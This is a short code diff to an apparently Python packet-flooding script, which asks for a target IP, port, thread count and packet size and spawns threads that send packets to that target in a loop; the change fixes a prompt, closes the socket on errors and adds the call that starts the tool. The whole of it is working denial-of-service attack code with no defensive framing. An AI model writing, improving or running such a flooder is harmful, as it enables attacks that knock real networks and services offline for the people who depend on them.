@@ -12,7 +12,7 @@ def main():
   """)
   ip = str(input("IP Target: "))
   port = int(input("Port Target: "))
-  threads = int(input("Threads "))
+  threads = int(input("Threads: "))
   conn = int(input("Multi Packet: "))
   psize = int(input("Packet Size: "))
   for x in range(threads):
@@ -29,4 +29,6 @@ def attack():
       for y in range(conn):
         s.sendto(pkt, (ip,port))
     except:
-      s.sendto(pkt, (ip,port))
+      s.close()
+
+main()
